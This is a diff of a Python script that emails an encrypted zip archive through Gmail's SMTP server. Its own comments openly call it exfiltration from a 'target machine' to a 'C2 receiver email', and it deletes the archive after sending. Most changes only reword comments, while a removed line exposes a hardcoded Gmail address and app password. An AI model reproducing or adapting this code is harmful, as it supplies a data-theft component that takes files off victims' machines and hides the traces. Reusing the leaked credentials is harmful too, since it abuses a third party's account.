@@ -7,7 +7,7 @@ def send_email_with_attachment(
     attachment_path, smtp_server, smtp_port, 
     login, password
 ):
-    # Check if file exists
+    # Check if the file exists
     if not os.path.exists(attachment_path):
         print(f"Error: File '{attachment_path}' not found.")
         return
@@ -36,7 +36,7 @@ def send_email_with_attachment(
     except Exception as e:
         print("Error sending email:", e)
 
-    # Delete the encrypted file after sending email
+    # Delete the encrypted file after sending the email
     os.remove(attachment_path)
     print(f"Encrypted file '{file_name}' deleted after exfiltration.")
 
@@ -47,9 +47,8 @@ if __name__ == "__main__":
         receiver_email="receiverc76@gmail.com",  # Replace with the C2 receiver email
         subject="Exfiltrated Encrypted File",
         body="This is the encrypted zip file sent from the target machine.",
-        attachment_path="c:/Users/Test 1/Desktop/code/encrypted_files.zip",  
+        attachment_path="c:/Users/Test 1/Desktop/code/encrypted_files.zip",  # Replace with the actual path to your encrypted file
         smtp_server="smtp.gmail.com",
         smtp_port=587,
-        login="nnqq9629@gmail.com",               # Same as sender email
-        password="fjunszcfgxeibwsk"               # Use app password
+        login="nnqq9629@gmail.com",              # Use your email address
     )
